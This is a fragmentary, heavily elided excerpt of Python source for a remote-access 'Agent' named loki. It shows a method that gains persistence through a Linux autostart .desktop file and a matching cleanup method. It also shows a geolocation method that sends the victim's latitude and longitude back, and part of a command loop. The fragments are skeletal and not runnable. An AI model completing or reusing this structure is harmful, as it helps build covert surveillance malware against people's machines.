...
class Agent(object):
    ...
    def persist(self):
        ...
        if self.is_installed():
            ...
            return
        if platform.system() == 'Linux':
            persist_dir = self.expand_path('~/.loki')
            ...
            if os.path.exists(self.expand_path("~/.config/autostart/")):
                ...
                with open(self.expand_path('~/.config/autostart/loki.desktop'), 'w') as f:
    ...
    def clean(self):
        ...
        if platform.system() == 'Linux':
            ...
            desktop_entry = self.expand_path('~/.config/autostart/loki.desktop')
    ...
    def geolocalisation(self):
        ...
        self.send_output("     >>>Latitude "+ str(lat))

        self.send_output("     >>>Longitude "+ str(lon))
                    ...
                    try:
                        if command == 'cd':
                            ...
                            if not args:
                                ...
                                self.record(args[0], args[1], args[2], args[3])
